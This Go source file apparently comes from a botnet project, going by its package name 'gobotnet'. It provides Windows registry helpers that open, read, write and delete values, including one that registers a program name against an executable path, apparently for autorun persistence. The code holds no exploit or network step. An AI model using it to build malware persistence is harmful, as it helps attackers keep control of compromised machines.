package gobotnet

import (
	"golang.org/x/sys/windows/registry"
)

func GetRegistryKey(typeReg registry.Key, regPath string) (key registry.Key, err error) {
	currentKey, err := registry.OpenKey(typeReg, regPath, registry.ALL_ACCESS)
	return currentKey, err
}

func GetRegistryKeyValue(typeReg registry.Key, regPath, nameKey string) (vaue string, err error) {
	key, err := GetRegistryKey(typeReg, regPath)
	if err != nil {
		return "", err
	}
	value, _, err := key.GetStringValue(nameKey)
	if err != nil {
		return "", err
	}
	return value, nil
}

func IsValueSetRegistryKey(typeReg registry.Key, regPath, nameValue string) error {
	currentKey, err := GetRegistryKey(typeReg, regPath)
	if err != nil {
		return err
	}
	defer currentKey.Close()

	_, _, err = currentKey.GetStringValue(nameValue)
	return err
}

func WriteRegistryKey(typeReg registry.Key, regPath, nameProgram, pathToExecFile string) error {
	updateKey, err := GetRegistryKey(typeReg, regPath)
	if err != nil {
		return err
	}
	defer updateKey.Close()
	return updateKey.SetStringValue(nameProgram, pathToExecFile)
}

func DeleteRegistryKey(typeReg registry.Key, regPath, nameProgram string) error {
	deleteKey, err := GetRegistryKey(typeReg, regPath)
	if err != nil {
		return err
	}
	defer deleteKey.Close()
	return deleteKey.DeleteValue(nameProgram)
}
